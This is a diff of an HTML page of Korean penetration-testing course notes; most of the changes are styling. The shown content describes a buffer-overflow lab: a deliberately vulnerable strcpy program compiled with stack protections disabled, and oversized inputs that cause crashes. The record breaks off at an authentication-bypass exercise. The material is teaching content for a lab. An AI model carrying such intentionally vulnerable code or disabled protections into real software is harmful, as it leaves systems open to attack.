@@ -5,29 +5,31 @@
 <title>보안·모의해킹 2 · SKT ALEPH 학습 노트</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+KR:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root{
-  --paper:#fbf8f3; --ink:#23201c; --muted:#6b6459; --rule:#e0d8cb;
-  --accent:#8a5a2b; --accent-soft:#f3e9dc; --code-bg:#f4efe6; --side:#f6f1e8; --mark:#ffe8a3;
+  --paper:#f7f7f5; --paper-strong:#ffffff; --ink:#252525; --muted:#787774; --rule:#e8e8e6;
+  --accent:#3d7188; --accent-soft:#e9f3f6; --code-bg:#1f2937; --code-ink:#e5edf4;
+  --code-border:#334454; --side:#f1f1ef; --mark:#fff0b8; --shadow:0 14px 36px rgba(37,37,37,.08);
 }
 @media (prefers-color-scheme: dark){
   :root{
-    --paper:#16181c; --ink:#e6e3dd; --muted:#9a958c; --rule:#2c3036;
-    --accent:#d0a06a; --accent-soft:#241f18; --code-bg:#1c1f24; --side:#101215; --mark:#5a4a12;
+    --paper:#191919; --paper-strong:#202020; --ink:#e7e7e5; --muted:#a6a6a0; --rule:#383836;
+    --accent:#8fc1d2; --accent-soft:#213238; --code-bg:#111827; --code-ink:#e5edf4;
+    --code-border:#405466; --side:#141414; --mark:#514614; --shadow:none;
   }
 }
 *{box-sizing:border-box}
 html{scroll-behavior:smooth; scroll-padding-top:16px}
 body{
   margin:0; background:var(--paper); color:var(--ink);
-  font-family:"Noto Serif KR","Apple SD Gothic Neo","Malgun Gothic",serif;
-  font-size:17px; line-height:1.85; word-break:keep-all; overflow-wrap:anywhere;
+  font-family:"Noto Sans KR","Apple SD Gothic Neo","Malgun Gothic",sans-serif;
+  font-size:16px; line-height:1.9; word-break:keep-all; overflow-wrap:anywhere;
 }
-.layout{display:grid; grid-template-columns:288px minmax(0,1fr); min-height:100vh}
+.layout{display:grid; grid-template-columns:276px minmax(0,1fr); min-height:100vh}
 aside{
   position:sticky; top:0; align-self:start; height:100vh; overflow:auto;
-  background:var(--side); border-right:1px solid var(--rule); padding:20px 14px 60px;
+  background:var(--side); border-right:1px solid var(--rule); padding:24px 14px 60px;
   font-family:ui-sans-serif,system-ui,"Malgun Gothic",sans-serif; font-size:13px; line-height:1.5;
 }
 aside .brand{font-size:15px; font-weight:700; margin:0 0 2px}
@@ -44,30 +46,51 @@ aside .lv3{padding-left:16px; color:var(--muted)}
 aside .lv4{padding-left:28px; color:var(--muted); font-size:12px}
 aside .inchap{margin:6px 0 10px; padding:8px 0 4px; border-top:1px dashed var(--rule); border-bottom:1px dashed var(--rule)}
 
-main{padding:40px 40px 120px; max-width:860px}
+main{margin:32px 40px 120px; padding:42px 50px 100px; max-width:920px; background:var(--paper-strong);
+     border:1px solid var(--rule); border-radius:16px; box-shadow:var(--shadow)}
 h1,h2,h3,h4{font-family:ui-sans-serif,system-ui,"Malgun Gothic",sans-serif; line-height:1.35; letter-spacing:-.02em}
-h1{font-size:30px; margin:0 0 8px}
-h2{font-size:23px; margin:44px 0 12px; padding-bottom:8px; border-bottom:2px solid var(--rule)}
-h3{font-size:18px; margin:30px 0 8px; color:var(--accent)}
-h4{font-size:15px; margin:22px 0 6px}
+h1{font-size:32px; margin:0 0 8px}
+h2{font-size:23px; margin:52px 0 14px; padding:12px 0 10px 15px; border-bottom:1px solid var(--rule); position:relative}
+h2::before{content:""; position:absolute; left:0; top:11px; bottom:10px; width:4px; border-radius:4px; background:var(--accent)}
+h3{font-size:18px; margin:34px 0 9px; color:var(--accent)}
+h4{font-size:15px; margin:24px 0 7px; color:var(--muted)}
 .chapter-no{font-family:ui-sans-serif,system-ui,sans-serif; font-size:11px; letter-spacing:.18em; color:var(--muted); font-weight:700}
-p{margin:0 0 14px}
+p{max-width:78ch; margin:0 0 16px}
 ul,ol{margin:0 0 14px; padding-left:22px}
 li{margin:3px 0}
-a{color:var(--accent)}
-blockquote{margin:16px 0; padding:10px 16px; border-left:4px solid var(--accent); background:var(--accent-soft)}
+a{color:var(--accent); text-underline-offset:3px}
+blockquote{margin:20px 0; padding:14px 18px; border:1px solid var(--rule); border-left:5px solid var(--accent);
+           border-radius:8px; background:var(--accent-soft)}
 blockquote p:last-child{margin:0}
 hr{border:0; border-top:1px solid var(--rule); margin:28px 0}
 mark{background:var(--mark); color:inherit}
-code{font-family:ui-monospace,"Cascadia Mono",Consolas,monospace; font-size:.88em; background:var(--code-bg); padding:1px 5px; border-radius:4px}
-pre{background:var(--code-bg); border:1px solid var(--rule); border-radius:8px; padding:14px 16px; overflow-x:auto; line-height:1.6; font-size:13.5px}
+code{font-family:ui-monospace,"Cascadia Mono",Consolas,monospace; font-size:.88em; background:var(--accent-soft); padding:2px 5px; border-radius:4px}
+pre{background:var(--code-bg); color:var(--code-ink); border:1px solid var(--code-border); border-radius:10px; padding:16px 18px;
+     overflow-x:auto; line-height:1.65; font-size:13.5px; white-space:pre; tab-size:2}
 pre code{background:none; padding:0; font-size:inherit}
-.codehilite{background:var(--code-bg); border:1px solid var(--rule); border-radius:8px; overflow-x:auto}
-.codehilite pre{border:0; margin:0; background:none}
+.code-shell{margin:22px 0 26px; border:1px solid var(--code-border); border-radius:12px; overflow:hidden;
+            background:var(--code-bg); box-shadow:0 8px 22px rgba(15,23,42,.12)}
+.code-toolbar{display:flex; align-items:center; gap:8px; min-height:38px; padding:0 12px;
+              background:#263646; color:#cbd8e2; font:12px/1 ui-sans-serif,system-ui,"Malgun Gothic",sans-serif}
+.code-mark{display:grid; place-items:center; width:20px; height:20px; border-radius:5px; background:#3d7188; color:#fff; font-weight:700}
+.code-label{font-weight:700; letter-spacing:.02em}
+.code-copy{margin-left:auto; border:1px solid #597081; border-radius:6px; padding:6px 9px; background:transparent; color:#dbe7ee;
+           font:inherit; cursor:pointer}
+.code-copy:hover{background:#385064}
+.codehilite{background:var(--code-bg); color:var(--code-ink); overflow-x:auto}
+.codehilite pre{border:0; border-radius:0; margin:0; background:transparent}
+.codehilite .c,.codehilite .ch,.codehilite .cm,.codehilite .c1{color:#94a3b8}
+.codehilite .k,.codehilite .kc,.codehilite .kd,.codehilite .kn,.codehilite .kp,.codehilite .kr{color:#93c5fd}
+.codehilite .s,.codehilite .sa,.codehilite .sb,.codehilite .sc,.codehilite .dl{color:#86efac}
+.codehilite .nf,.codehilite .nc{color:#f9a8d4}
+.codehilite .m,.codehilite .mi,.codehilite .mf{color:#fcd34d}
 .tablewrap{overflow-x:auto; margin:0 0 18px}
 table{border-collapse:collapse; width:100%; font-size:14.5px; font-family:ui-sans-serif,system-ui,sans-serif}
 th,td{border:1px solid var(--rule); padding:8px 10px; text-align:left; vertical-align:top}
 th{background:var(--accent-soft); font-weight:700}
+table tr:first-child td{background:var(--accent-soft); font-weight:700}
+tbody tr:nth-child(even) td{background:var(--side)}
+@supports (background:color-mix(in srgb, white 50%, black)){tbody tr:nth-child(even) td{background:color-mix(in srgb, var(--paper-strong) 88%, var(--accent-soft))}}
 .admonition{border:1px solid var(--rule); border-left:5px solid var(--accent); border-radius:6px; padding:12px 16px; margin:18px 0; background:var(--accent-soft)}
 .admonition-title{font-weight:700; margin:0 0 6px !important}
 .nav{display:flex; justify-content:space-between; gap:12px; margin-top:60px; padding-top:20px; border-top:1px solid var(--rule);
@@ -78,6 +101,7 @@ th{background:var(--accent-soft); font-weight:700}
 .cover{border:1px solid var(--rule); border-radius:10px; padding:26px 28px; background:var(--accent-soft); margin-bottom:34px}
 .cover h1{font-size:34px; margin:0 0 6px}
 .cover p{margin:0; color:var(--muted)}
+.chapter-head{margin-bottom:30px; padding-bottom:22px; border-bottom:1px solid var(--rule)}
 .toclist{list-style:none; padding:0; margin:0}
 .toclist li{margin:0 0 6px}
 .toclist .part{margin:26px 0 10px; font-size:11px; letter-spacing:.2em; color:var(--accent); font-weight:700;
@@ -91,13 +115,13 @@ th{background:var(--accent-soft); font-weight:700}
 @media (max-width:900px){
   .layout{grid-template-columns:1fr}
   aside{position:static; height:auto; border-right:0; border-bottom:1px solid var(--rule)}
-  main{padding:26px 18px 90px}
+  main{margin:0; padding:30px 20px 90px; max-width:none; border:0; border-radius:0; box-shadow:none}
 }
 @media print{
   aside,#top,.nav{display:none}
   .layout{display:block}
-  main{max-width:none; padding:0}
-  pre,table,.admonition{break-inside:avoid}
+  main{max-width:none; margin:0; padding:0; border:0; box-shadow:none}
+  pre,table,.admonition,.code-shell{break-inside:avoid}
   h2,h3{break-after:avoid}
 }
 </style>
@@ -109,7 +133,7 @@ th{background:var(--accent-soft); font-weight:700}
   <input id="q" type="search" placeholder="목차 검색" aria-label="목차 검색">
   <nav><div class="part">시작하기</div><a class="" href="ch01.html">01. 책 사용법</a><div class="part">시작하기</div><a class="" href="ch02.html">02. 전체 커리큘럼 지도</a><div class="part">시작하기</div><a class="" href="ch03.html">03. 과정 개요</a><div class="part">1부 · 네트워크</div><a class="" href="ch04.html">04. 네트워크·Cisco Packet Tracer</a><div class="part">1부 · 네트워크</div><a class="" href="ch12.html">05. 네트워크 핵심키워드 1</a><div class="part">1부 · 네트워크</div><a class="" href="ch13.html">06. 네트워크 핵심키워드 2</a><div class="part">1부 · 네트워크</div><a class="" href="ch14.html">07. 네트워크 핵심키워드 3</a><div class="part">1부 · 네트워크</div><a class="" href="ch05.html">08. 네트워크 보안 통합 Lab</a><div class="part">2부 · Linux·서버</div><a class="" href="ch06.html">09. Rocky Linux 개인 서버</a><div class="part">2부 · Linux·서버</div><a class="" href="ch07.html">10. NFS·Samba·SELinux·rsyslog·LogAnalyzer</a><div class="part">2부 · Linux·서버</div><a class="" href="ch08.html">11. vi·프로토콜·Windows IIS</a><div class="part">2부 · Linux·서버</div><a class="" href="ch09.html">12. Linux 메모리·커널·MariaDB 계정·Kali</a><div class="part">2부 · Linux·서버</div><a class="" href="ch15.html">13. Linux 서버 핵심키워드 1</a><div class="part">2부 · Linux·서버</div><a class="" href="ch16.html">14. Linux 서버 핵심키워드 2</a><div class="part">2부 · Linux·서버</div><a class="" href="ch17.html">15. Windows Server 핵심키워드</a><div class="part">3부 · DB·웹</div><a class="" href="ch10.html">16. MariaDB SQL·백업·복제</a><div class="part">3부 · DB·웹</div><a class="" href="ch11.html">17. 팀 웹·원격 MariaDB 연동</a><div class="part">3부 · DB·웹</div><a class="" href="ch18.html">18. 데이터베이스 핵심키워드</a><div class="part">4부 · 운영·자동화</div><a class="" href="ch19.html">19. 모니터링·운영·클라우드</a><div class="part">4부 · 운영·자동화</div><a class="" href="ch20.html">20. Python·자동화</a><div class="part">5부 · 보안·모의해킹</div><a class="" href="ch21.html">21. 보안·모의해킹 1</a><div class="part">5부 · 보안·모의해킹</div><a class="cur" href="ch22.html">22. 보안·모의해킹 2</a><div class="inchap"><a class="lv3" href="#126-버퍼-오버플로우bof">126. 버퍼 오버플로우(BOF)</a><a class="lv4" href="#1-버퍼-오버플로우bof-개요">1. 버퍼 오버플로우(BOF) 개요</a><a class="lv4" href="#2-메모리-보호-기법">2. 메모리 보호 기법</a><a class="lv4" href="#3-취약한-c-함수">3. 취약한 C 함수</a><a class="lv4" href="#4-세그멘테이션-폴트-확인">4. 세그멘테이션 폴트 확인</a><a class="lv4" href="#5-즉시-종료-여부-차이-확인">5. 즉시 종료 여부 차이 확인</a><a class="lv4" href="#6-인증-우회">6. 인증 우회</a><a class="lv4" href="#7-시스템-함수-명령어-변조">7. 시스템 함수 명령어 변조</a><a class="lv4" href="#8-aslr-설정-확인-및-변경">8. ASLR 설정 확인 및 변경</a><a class="lv3" href="#127-포맷-스트링-취약점-개념">127. 포맷 스트링 취약점 개념</a><a class="lv4" href="#1-포맷-스트링format-string-취약점-개요">1. 포맷 스트링(Format String) 취약점 개요</a><a class="lv4" href="#2-포맷-스트링-주요-기호">2. 포맷 스트링 주요 기호</a><a class="lv4" href="#3-포맷-스트링-메모리-읽기">3. 포맷 스트링 메모리 읽기</a><a class="lv4" href="#4-포맷-스트링-메모리-쓰기">4. 포맷 스트링 메모리 쓰기</a><a class="lv4" href="#5-정리">5. 정리</a><a class="lv3" href="#136-brute-force">136. Brute Force</a><a class="lv4" href="#1-brute-force-개요">1. Brute Force 개요</a><a class="lv4" href="#2-low-level-소스-분석">2. Low Level 소스 분석</a><a class="lv4" href="#3-hydra를-이용한-공격">3. Hydra를 이용한 공격</a><a class="lv4" href="#4-burp-suite-intruder를-이용한-공격">4. Burp Suite Intruder를 이용한 공격</a><a class="lv4" href="#5-owasp-zap을-이용한-공격">5. OWASP ZAP을 이용한 공격</a><a class="lv4" href="#6-보안-레벨별-차이">6. 보안 레벨별 차이</a><a class="lv3" href="#137-captcha-개요-및-xss-reflected">137. Captcha 개요 및 XSS Reflected</a><a class="lv4" href="#1-captcha캡차-개요">1. Captcha(캡차) 개요</a><a class="lv4" href="#2-xsscross-site-scripting-개요">2. XSS(Cross Site Scripting) 개요</a><a class="lv4" href="#3-low-level--xss-reflected">3. Low Level — XSS Reflected</a><a class="lv4" href="#4-medium-level--xss-reflected">4. Medium Level — XSS Reflected</a><a class="lv4" href="#5-high-level--xss-reflected">5. High Level — XSS Reflected</a><a class="lv4" href="#6-impossible-level--xss-reflected">6. Impossible Level — XSS Reflected</a><a class="lv3" href="#138-command-injection-취약점">138. Command Injection 취약점</a><a class="lv4" href="#1-command-injection-개요">1. Command Injection 개요</a><a class="lv4" href="#2-low-level">2. Low Level</a><a class="lv4" href="#3-medium-level">3. Medium Level</a><a class="lv4" href="#4-high-level">4. High Level</a><a class="lv4" href="#5-impossible-level">5. Impossible Level</a><a class="lv3" href="#139-dvwa-환경-구축">139. DVWA 환경 구축</a><a class="lv4" href="#1-dvwa-머신-개요">1. DVWA 머신 개요</a><a class="lv4" href="#2-virtualbox-머신-생성">2. VirtualBox 머신 생성</a><a class="lv4" href="#3-네트워크ip-설정">3. 네트워크(IP) 설정</a><a class="lv4" href="#4-칼리-리눅스와의-통신-확인">4. 칼리 리눅스와의 통신 확인</a><a class="lv3" href="#140-file-inclusion-취약점">140. File Inclusion 취약점</a><a class="lv4" href="#1-file-inclusion-개요">1. File Inclusion 개요</a><a class="lv4" href="#2-low-level--lfi">2. Low Level — LFI</a><a class="lv4" href="#3-medium-level-2">3. Medium Level</a><a class="lv4" href="#4-high-level-2">4. High Level</a><a class="lv4" href="#5-impossible-level-2">5. Impossible Level</a><a class="lv3" href="#141-file-upload-취약점">141. File Upload 취약점</a><a class="lv4" href="#1-실제-공격자-입장에서의-접근">1. 실제 공격자 입장에서의 접근</a><a class="lv4" href="#2-low-level-2">2. Low Level</a><a class="lv4" href="#3-medium-level-3">3. Medium Level</a><a class="lv4" href="#4-high-level-3">4. High Level</a><a class="lv4" href="#5-impossible-level-3">5. Impossible Level</a><a class="lv3" href="#142-isms-p-정보보호인증제도">142. ISMS-P 정보보호인증제도</a><a class="lv4" href="#1-기업정보보호관리">1. 기업정보보호관리</a><a class="lv4" href="#2-정보보호인증제도isms-p">2. 정보보호인증제도(ISMS-P)</a><a class="lv4" href="#3-isms-p-점검-항목-구조">3. ISMS-P 점검 항목 구조</a><a class="lv3" href="#143-xss-stored">143. XSS Stored</a><a class="lv4" href="#1-xss-stored-개요">1. XSS Stored 개요</a><a class="lv4" href="#2-low-level-3">2. Low Level</a><a class="lv4" href="#3-medium-level-4">3. Medium Level</a><a class="lv4" href="#4-high-level-4">4. High Level</a><a class="lv4" href="#5-reflected와-stored의-핵심-차이-정리">5. Reflected와 Stored의 핵심 차이 정리</a><a class="lv3" href="#144-웹해킹-기초이론">144. 웹해킹 기초이론</a><a class="lv4" href="#1-owasp-개요">1. OWASP 개요</a><a class="lv4" href="#2-http-상태-코드">2. HTTP 상태 코드</a><a class="lv4" href="#3-http-메소드">3. HTTP 메소드</a><a class="lv4" href="#4-cwe와-cve">4. CWE와 CVE</a><a class="lv4" href="#5-웹해킹-실습-환경-소개">5. 웹해킹 실습 환경 소개</a><a class="lv3" href="#145-csrf">145. CSRF</a><a class="lv4" href="#1-csrf-개요">1. CSRF 개요</a><a class="lv4" href="#2-low-레벨">2. Low 레벨</a><a class="lv4" href="#3-medium-레벨">3. Medium 레벨</a><a class="lv4" href="#4-high-레벨">4. High 레벨</a><a class="lv4" href="#5-impossible-레벨">5. Impossible 레벨</a><a class="lv4" href="#6-csrf-종합-정리">6. CSRF 종합 정리</a><a class="lv3" href="#146-dvwa">146. DVWA</a><a class="lv4" href="#1-dvwa-설치">1. DVWA 설치</a><a class="lv4" href="#2-시스템-업데이트">2. 시스템 업데이트</a><a class="lv4" href="#3-패키지-설치">3. 패키지 설치</a><a class="lv4" href="#4-mariadb-설정">4. MariaDB 설정</a><a class="lv4" href="#5-dvwa-소스-다운로드">5. DVWA 소스 다운로드</a><a class="lv4" href="#6-dvwa-설정-파일-수정">6. DVWA 설정 파일 수정</a><a class="lv4" href="#7-디렉토리-권한-설정">7. 디렉토리 권한 설정</a><a class="lv4" href="#8-php-설정-수정">8. PHP 설정 수정</a><a class="lv4" href="#9-서비스-시작-및-접속-확인">9. 서비스 시작 및 접속 확인</a><a class="lv4" href="#10-새로운-dvwa의-추가-항목">10. 새로운 DVWA의 추가 항목</a><a class="lv3" href="#147-sql-injection-수동-점검">147. SQL Injection 수동 점검</a><a class="lv4" href="#1-sql-인젝션-개요">1. SQL 인젝션 개요</a><a class="lv4" href="#2-환경-준비">2. 환경 준비</a><a class="lv4" href="#3-low-레벨-수동-점검">3. Low 레벨 수동 점검</a><a class="lv4" href="#4-low-레벨-코드-분석">4. Low 레벨 코드 분석</a><a class="lv4" href="#5-medium-레벨">5. Medium 레벨</a><a class="lv4" href="#6-high-레벨">6. High 레벨</a><a class="lv4" href="#7-impossible-레벨">7. Impossible 레벨</a><a class="lv4" href="#8-sql-인젝션-수동-점검-절차-요약">8. SQL 인젝션 수동 점검 절차 요약</a><a class="lv3" href="#148-sql-injection-자동화-및-blind">148. SQL Injection 자동화 및 Blind</a><a class="lv4" href="#1-sqlmap-개요">1. sqlmap 개요</a><a class="lv4" href="#2-사전-준비--쿠키-정보-확인">2. 사전 준비 — 쿠키 정보 확인</a><a class="lv4" href="#3-sqlmap-기본-명령어-구조">3. sqlmap 기본 명령어 구조</a><a class="lv4" href="#4-취약점-점검-결과-확인">4. 취약점 점검 결과 확인</a><a class="lv4" href="#5-db-정보-추출">5. DB 정보 추출</a><a class="lv4" href="#6-sql-injection-blind">6. SQL Injection Blind</a><a class="lv4" href="#7-수동-점검과-자동화-도구-비교">7. 수동 점검과 자동화 도구 비교</a><a class="lv3" href="#149-세션-취약점과-스크립트-공격-분석">149. 세션 취약점과 스크립트 공격 분석</a><a class="lv4" href="#1-weak-session-ids-취약한-세션-아이디">1. Weak Session IDs (취약한 세션 아이디)</a><a class="lv4" href="#2-dom-xss-dom-기반-xss">2. DOM XSS (DOM 기반 XSS)</a><a class="lv4" href="#3-csp-bypass-content-security-policy-우회">3. CSP Bypass (Content Security Policy 우회)</a><a class="lv4" href="#4-javascript-공격">4. JavaScript 공격</a><a class="lv3" href="#150-인가-우회-리디렉트-취약점-암호학-api-취약점-분석">150. 인가 우회, 리디렉트 취약점, 암호학, API 취약점 분석</a><a class="lv4" href="#1-authorization-bypass-인가-우회">1. Authorization Bypass (인가 우회)</a><a class="lv4" href="#2-open-http-redirect">2. Open HTTP Redirect</a><a class="lv4" href="#3-cryptography-암호학">3. Cryptography (암호학)</a><a class="lv4" href="#4-api">4. API</a><a class="lv3" href="#151-a2-인증-및-세션-관리-취약점">151. A2 인증 및 세션 관리 취약점</a><a class="lv4" href="#1-a2-인증-관련-취약점-개요">1. A2 인증 관련 취약점 개요</a><a class="lv4" href="#2-captcha-bypassing">2. Captcha Bypassing</a><a class="lv4" href="#3-forgotten-function-비밀번호-찾기-취약점">3. Forgotten Function (비밀번호 찾기 취약점)</a><a class="lv4" href="#4-insecure-login-form-취약한-로그인-폼">4. Insecure Login Form (취약한 로그인 폼)</a><a class="lv4" href="#5-logout-management-로그아웃-세션-미종료">5. Logout Management (로그아웃 세션 미종료)</a><a class="lv4" href="#6-password-attacks-패스워드-공격">6. Password Attacks (패스워드 공격)</a><a class="lv4" href="#7-administrative-portal-관리자-포털-세션-취약점">7. Administrative Portal (관리자 포털 세션 취약점)</a><a class="lv4" href="#8-session-management--cookies">8. Session Management — Cookies</a><a class="lv4" href="#9-session-id-in-url-url-세션-id-노출">9. Session ID in URL (URL 세션 ID 노출)</a><a class="lv4" href="#10-strong-sessions-세션-강도-확인">10. Strong Sessions (세션 강도 확인)</a><a class="lv3" href="#152-beebox-실습-환경-구성">152. beebox 실습 환경 구성</a><a class="lv4" href="#네트워크-인프라-1교시-강의-교안">네트워크 인프라 1교시 강의 교안</a><a class="lv4" href="#1-beebox-실습-환경-구성">1. beebox 실습 환경 구성</a><a class="lv4" href="#2-bwapp-실습-환경-접속">2. BWAPP 실습 환경 접속</a><a class="lv4" href="#3-a1-인젝션--html-injection">3. A1 인젝션 — HTML Injection</a><a class="lv4" href="#4-a1-인젝션--iframe-injection">4. A1 인젝션 — iFrame Injection</a><a class="lv4" href="#5-a1-인젝션--ldap-injection">5. A1 인젝션 — LDAP Injection</a><a class="lv4" href="#6-a1-인젝션--mail-header-injection">6. A1 인젝션 — Mail Header Injection</a><a class="lv4" href="#7-a1-인젝션--os-command-injection">7. A1 인젝션 — OS Command Injection</a><a class="lv4" href="#8-a1-인젝션--php-code-injection">8. A1 인젝션 — PHP Code Injection</a><a class="lv4" href="#9-a1-인젝션--ssi-server-side-include-injection">9. A1 인젝션 — SSI (Server-Side Include) Injection</a><a class="lv3" href="#153-sql-injection-심화-실습">153. SQL Injection 심화 실습</a><a class="lv4" href="#1-sql-injection--ajaxjsonjquery">1. SQL Injection — Ajax/JSON/jQuery</a><a class="lv4" href="#2-sql-injection--captcha">2. SQL Injection — Captcha</a><a class="lv4" href="#3-sql-injection--login-form-getpost">3. SQL Injection — Login Form (GET/POST)</a><a class="lv4" href="#4-sql-injection--로그인-폼-슈퍼히어로--일반-사용자">4. SQL Injection — 로그인 폼 (슈퍼히어로 / 일반 사용자)</a><a class="lv4" href="#5-sql-injection--sqlite">5. SQL Injection — SQLite</a><a class="lv4" href="#6-sql-injection--drupal-cve-코드-활용">6. SQL Injection — Drupal (CVE 코드 활용)</a><a class="lv4" href="#7-sql-injection--user-agent">7. SQL Injection — User-Agent</a><a class="lv4" href="#8-sql-injection--xml--xpath">8. SQL Injection — XML / XPath</a><a class="lv4" href="#9-sql-injection--blind">9. SQL Injection — Blind</a></div><div class="part">5부 · 보안·모의해킹</div><a class="" href="ch23.html">23. 보안·모의해킹 3</a><div class="part">5부 · 보안·모의해킹</div><a class="" href="ch24.html">24. 보안·모의해킹 4</a><div class="part">부록·자료 보관</div><a class="" href="ch25.html">25. 중복과 상충 정리</a><div class="part">부록·자료 보관</div><a class="" href="ch26.html">26. 공식 문서 대조</a><div class="part">부록·자료 보관</div><a class="" href="ch27.html">27. 명령어 색인</a><div class="part">부록·자료 보관</div><a class="" href="ch28.html">28. 용어집</a><div class="part">원문 보존</div><a class="" href="archive-01.html">원문 01. 원문 01 · 260819 네트워크 수업 완전 정리</a><a class="" href="archive-02.html">원문 02. 원문 02 · Cisco Packet Tracer 개인과제 완성 가이드</a><a class="" href="archive-03.html">원문 03. 원문 03 · 서브네팅·라우팅·RIP 수업정리</a><a class="" href="archive-04.html">원문 04. 원문 04 · 운영체제와 네트워크보안 PDF 학습노트</a><a class="" href="archive-05.html">원문 05. 원문 05 · IT 인프라·운영체제·네트워크·보안 통합노트</a></nav>
 </aside>
-<main><div class="chapter-no">CHAPTER 22</div><h1>보안·모의해킹 2</h1><h3 id="126-버퍼-오버플로우bof">126. 버퍼 오버플로우(BOF)</h3>
+<main><header class="chapter-head"><div class="chapter-no">CHAPTER 22</div><h1>보안·모의해킹 2</h1></header><h3 id="126-버퍼-오버플로우bof">126. 버퍼 오버플로우(BOF)</h3>
 <h4 id="1-버퍼-오버플로우bof-개요">1. 버퍼 오버플로우(BOF) 개요</h4>
 <h5 id="1-1-buffer">1-1. 버퍼(Buffer)란</h5>
 <p>버퍼는 메모리의 일종으로, 임시로 데이터를 저장하는 공간이다. 시스템 내부의 CPU, 메모리, 디스크 등 각 장치의 처리 속도가 서로 다르기 때문에, 이를 조율하는 완충 장치 역할을한다.</p>
@@ -207,24 +231,24 @@ th{background:var(--accent-soft); font-weight:700}
 <p>⚠️ 개발자 입장에서 입력값 검증 없이 strcpy 를 사용하면 BOF 취약점이 발생할 수 있다. strncpy 를 사용하여 입력 길이를 반드시 검증해야 한다.</p>
 <h4 id="4-세그멘테이션-폴트-확인">4. 세그멘테이션 폴트 확인</h4>
 <h5 id="4-1">4-1. 소스 코드 작성</h5>
-<div class="codehilite"><pre><span></span><code>// bof_vln.c — strcpy를 사용하는 BOF 취약 프로그램
+<div class="code-shell" data-language="Text"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Text</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>// bof_vln.c — strcpy를 사용하는 BOF 취약 프로그램
 // 버퍼 크기: 16바이트
-</code></pre></div>
+</code></pre></div></div>
 
 <p>vi 로 파일을 생성한다.</p>
-<div class="codehilite"><pre><span></span><code>sudo vi bof_vln.c
-</code></pre></div>
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code>sudo vi bof_vln.c
+</code></pre></div></div>
 
 <p>프로그램 구조 요약:</p>
 <p>char buffer[16]  : 16바이트 버퍼 선언</p>
 <p>strcpy(buffer, str)  : 입력 길이 검증 없이 버퍼에 복사</p>
 <p>printf("문자열: %s", buffer)  : 버퍼 내용 출력</p>
 <h5 id="4-2">4-2. 컴파일 (메모리 보호 기법 우회 옵션 적용)</h5>
-<div class="codehilite"><pre><span></span><code># 카나리 삽입 비활성화 / NX Bit 해제 / PIE 비활성화 옵션으로 컴파
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 카나리 삽입 비활성화 / NX Bit 해제 / PIE 비활성화 옵션으로 컴파
 일
 sudo gcc -fno-stack-protector -z execstack -no-pie -o bof-v
 uln bof_vln.c
-</code></pre></div>
+</code></pre></div></div>
 
 <div class="tablewrap"><table>
 <thead>
@@ -249,13 +273,13 @@ uln bof_vln.c
 </tbody>
 </table></div>
 <h5 id="4-3">4-3. 실행 결과</h5>
-<div class="codehilite"><pre><span></span><code># 정상 입력 (16바이트 이하)
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 정상 입력 (16바이트 이하)
 ./bof-vuln hello
 # → &quot;hello&quot; 출력
 # 버퍼 초과 입력 (20바이트)
 ./bof-vuln AAAAAAAAAAAAAAAAAAAA
 # → Segmentation fault (core dumped)
-</code></pre></div>
+</code></pre></div></div>
 
 <p>버퍼 크기(16바이트)를 초과하는 데이터를 입력하면 세그멘테이션 폴트가 발생하며, 이는 오버플로우가 일어났음을 의미한다.</p>
 <h4 id="5-즉시-종료-여부-차이-확인">5. 즉시 종료 여부 차이 확인</h4>
@@ -299,14 +323,14 @@ uln bof_vln.c
 </table></div>
 <p>프로그램이 비정상 동작하거나 공격자의 셸 코드가 실행되려면 반드시 RET 주소 영역까지 침범해야 한다. 버퍼를 조금 초과했다고 해서 바로 오버플로우가 발생하는 것은 아니다.</p>
 <h5 id="5-2">5-2. 실행 결과 비교</h5>
-<div class="codehilite"><pre><span></span><code># 16바이트 이하 입력 → 정상 종료 메시지 출력
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 16바이트 이하 입력 → 정상 종료 메시지 출력
 ./bof-test hello
 # 17바이트 입력 → 프로그램 실행은 완료되나 세그멘테이션 폴트 발생
 ./bof-test AAAAAAAAAAAAAAAAA
 # 버퍼를 훨씬 초과하는 입력 → 정상 종료 메시지 미출력, 즉시 세그멘테
 이션 폴트
 ./bof-test AAAAAAAAAAAAAAAAAAAAAAAAAAA...
-</code></pre></div>
+</code></pre></div></div>
 
 <p>정상 종료 메시지가 뜨지 않는다는 것은 프로그램이 끝까지 실행되지 않았음을 의미한다. 이는 RET 주소까지 침범되어 프로그램이 중단된 것이다.</p>
 <h4 id="6-인증-우회">6. 인증 우회</h4>
@@ -316,12 +340,12 @@ uln bof_vln.c
 <p>strcpy  사용으로 입력 길이 검증 없음</p>
 <p>비밀번호가 secret123 일 때만 인증 성공 출력</p>
 <h5 id="6-2">6-2. 컴파일</h5>
-<div class="codehilite"><pre><span></span><code># 카나리 비활성화 옵션으로 컴파일
+<div class="code-shell" data-language="Shell"><div class="code-toolbar"><span class="code-mark">⌘</span><span class="code-label">Shell</span><button class="code-copy" type="button">복사</button></div><div class="codehilite"><pre><span></span><code># 카나리 비활성화 옵션으로 컴파일
 sudo gcc -fno-stack-protector -o bof-auth bof_auth.c
-</code></pre></div>
+</code></pre></div></div>
 
 <h5 id="6-3">6-3. 실행 결과</h5>
-<div class="codehilite"><pre><span></span><code># 정상 입력
